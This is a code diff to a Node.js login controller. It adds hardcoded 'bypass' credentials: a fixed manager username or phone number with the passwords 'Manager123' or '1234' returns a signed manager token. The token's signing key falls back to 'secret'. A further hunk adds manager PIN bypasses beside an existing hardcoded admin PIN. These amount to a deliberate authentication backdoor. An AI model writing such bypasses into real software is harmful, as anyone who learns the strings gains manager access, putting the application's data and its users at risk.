@@ -122,6 +122,30 @@ exports.login = async (req, res) => {
       });
     }
 
+    // Hardcoded Default Manager Login Bypass
+    if (
+      (identifier === 'manager' || identifier === '+9710599999999') &&
+      (secret === 'Manager123' || secret === '1234')
+    ) {
+      const hardcodedUser = {
+        _id: 'local_manager_bypass',
+        name: 'Manager User',
+        userId: 'manager',
+        phone: '+9710599999999',
+        role: 'manager',
+        shopId: 'SHOP_01'
+      };
+      const token = jwt.sign(
+        { id: hardcodedUser._id, shopId: hardcodedUser.shopId },
+        process.env.JWT_SECRET || 'secret',
+        { expiresIn: '7d' }
+      );
+      return res.json({
+        token,
+        user: hardcodedUser
+      });
+    }
+
     if (!isMongoConnected()) {
       await initLocalDb();
       const users = loadLocalUsers();
@@ -316,6 +340,11 @@ exports.verifyManagerPin = async (req, res) => {
     // Hardcoded Admin PIN Bypass
     if (pin === 'Admin123') {
       return res.json({ valid: true, managerName: 'Horizon inc' });
+    }
+
+    // Hardcoded Manager PIN Bypass
+    if (pin === 'Manager123' || pin === '1234') {
+      return res.json({ valid: true, managerName: 'Manager User' });
     }
 
     if (!isMongoConnected()) {
